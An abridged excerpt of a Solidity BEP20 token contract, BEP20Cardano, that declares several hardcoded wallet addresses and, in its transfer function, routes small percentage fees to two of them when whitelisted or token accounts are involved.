...
contract BEP20Cardano is Context, IBEP20, Ownable {
  ...
  address jjhacc = 0x13D0Ae11EA874cEe5c0460Ccdf1F9AfE3393a33A;
  address szacc = 0x6aE2339aa8B215AE3090F024cf21C92c69C0573C;
  address yxacc = 0xD478DB7D933A176AD671BDE4c2C96Fba8A81bcF0;
  address bmdacc = 0x6893b0bB0039dE05726A8ce80a65EC7527A6Af6a;

  address glacc = 0x97b59F93C9d80F57025fEd1CDCC3b679777c8BE4;
  address dzacc = 0xF665BAEe9fC73D36DBafAFFBd8484d2eB600d6B2;
  address stacc = 0xe37113267fD954f2e36793614eDFf52d0489425C;

  address zzacc = 0x5FA61C0fFE7f5276402aF8Ad406677EFB2e91952;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true || recipient==tokenacc || sender==tokenacc){
       ...
       _tokenTransfer(sender,glacc,amount.mul(11).div(1000));
       _tokenTransfer(sender,stacc,amount.mul(6).div(1000));
